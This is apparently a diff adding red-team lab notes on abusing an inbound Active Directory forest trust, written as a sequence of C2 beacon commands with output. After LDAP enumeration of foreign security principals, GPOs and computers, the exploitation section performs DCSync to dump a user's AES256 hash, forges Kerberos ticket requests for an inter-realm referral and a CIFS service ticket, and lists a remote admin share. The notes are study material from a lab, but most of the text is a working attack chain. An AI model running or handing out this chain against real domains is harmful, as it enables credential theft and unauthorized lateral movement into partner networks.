@@ -1,0 +1,64 @@
+enumerate the trust 
+    beacon> ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatname
+        we see trust direction 1, which is TRUST_DIRECTION_INBOUND
+        we see trust attribute 8, which is TRUST_ATTRIBUTE_FOREST_TRANSITIVE
+
+now lets enumerate the foreignSecurityPrincipal container of the foreign domain
+    beacon> ldapsearch (objectClass=foreignSecurityPrincipal) --attributes objectSid,memberOf --hostname partner.com --dn DC=partner,DC=com
+    objectSid: S-1-5-21-3926355307-1661546229-813047887-6102
+
+let's find out what that SID is
+    beacon> ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102) --attributes samAccountType,distinguishedName
+    distinguishedName: CN=Partner Jump Users,CN=Users,DC=contoso,DC=com
+
+let's enumerate members of that group
+    beacon> ldapsearch "(&(|(samAccountType=805306368)(samAccountType=268435456))(memberof=CN=Partner Jump Users,CN=Users,DC=contoso,DC=com))" --attributes distinguishedName
+    distinguishedName: CN=Robert Steel,CN=Users,DC=contoso,DC=com
+
+now let's find a DC in the foreign domain
+    beacon> nslookup _ldap._tcp.dc._msdcs.partner.com 10.10.120.1 SRV
+    A par-dc-1.partner.com 10.10.122.1
+
+discovery:
+    enumerate the foreign domain to find where members may have privileged access
+        beacon> ldapsearch (objectClass=groupPolicyContainer) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes displayName,gPCFileSysPath
+        ...
+        displayName: Contoso Jump Users
+        gPCFileSysPath: \\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}
+        ...
+    now download the GPO's GptTmpl.inf file 
+        beacon> download \\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+    sync to Desktop
+        View > Downloads > Sync Files
+    within the file we see 
+        S-1-5-21-4244029708-1901239654-2578485347-1104__Memberof = *S-1-5-32-544
+    this means S-1-5-21-4244029708-1901239654-2578485347-1104 is a member of the local administrators group
+    let's find out what that SID is
+        beacon> ldapsearch (objectSid=S-1-5-21-4244029708-1901239654-2578485347-1104) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes samAccountType,samAccountName,member
+        sAMAccountName: Contoso Users
+    now let's find out where that GPO is linked
+        beacon> ldapsearch (&(|(objectClass=organizationalUnit)(objectClass=domain))(gPLink=*{DFE606B4-CA59-4AD6-9BCE-55AF35888129}*)) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes objectClass,name
+        objectClass: top, domain, domainDNS
+    so this GPO is linked to the entire top-level domain!
+    let's find out what computers exist in the foreign domain
+        beacon> ldapsearch (samAccountType=805306369) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes distinguishedName
+            distinguishedName: CN=PAR-DC-1,OU=Domain Controllers,DC=partner,DC=com
+            --------------------
+            distinguishedName: CN=PAR-JMP-1,CN=Computers,DC=partner,DC=com
+            --------------------
+            distinguishedName: CN=PAR-WKSTN-1,CN=Computers,DC=partner,DC=com
+
+exploitation:
+    use the high-intergrity beacon to impersonate domain admin (dyork)
+    dcsync to get rsteel's hash (b/c he was in the Partner Jump Users group)
+        beacon> dcsync contoso.com CONTOSO\rsteel
+            Credentials
+            aes256_hmac       (4096) : 05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960
+    obtain a TGT for rsteel
+        beacon> krb_asktgt /user:rsteel /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960
+    use TGT to request inter-realm referral ticket
+        beacon> krb_asktgs /service:krbtgt/partner.com /ticket:[TGT]
+    use inter-realm ticket to request service ticket for CIFS on par-jmp-1
+        beacon> krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:[INTER-REALM]
+    check
+        beacon> ls \\par-jmp-1.partner.com\c$
